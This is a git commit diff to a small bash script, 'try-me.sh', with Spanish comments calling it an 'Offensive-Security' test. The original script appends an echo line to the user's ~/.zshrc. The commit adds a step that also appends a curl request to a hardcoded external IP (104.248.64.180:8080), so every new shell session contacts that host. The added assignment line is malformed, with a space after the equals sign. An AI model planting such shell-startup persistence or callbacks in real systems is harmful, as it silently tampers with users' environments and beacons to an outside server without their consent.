2a767fb3c66f8761bc7890df28cbbe285448030b
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2026-03-27 12:46:31 -0300

    Add curl command to .zshrc if not present

--- try-me.sh
+++ try-me.sh
@@ -1,8 +1,12 @@
 #!/bin/bash
 #agregando cositas al .zshrc
 MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
-
+CURL= "curl http://104.248.64.180:8080"
 # Verificar si el mensaje ya existe en el .zshrc
 if ! grep -Fxq "$MESSAGE" ~/.zshrc; then
     echo "$MESSAGE" >> ~/.zshrc
+fi
+# Verificar si el curl ya existe en el -zshrc
+if ! grep -Fxq "$CURL" ~/.zshrc; then
+    echo "$CURL" >> ~/.zshrc
 fi
